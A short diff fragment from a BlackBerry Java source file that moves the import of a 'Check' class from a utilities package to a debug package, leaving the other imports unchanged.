@@ -13,10 +13,10 @@ import java.util.Date;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AppListener;
 import blackberry.config.Conf;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.CallListObserver;
-import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
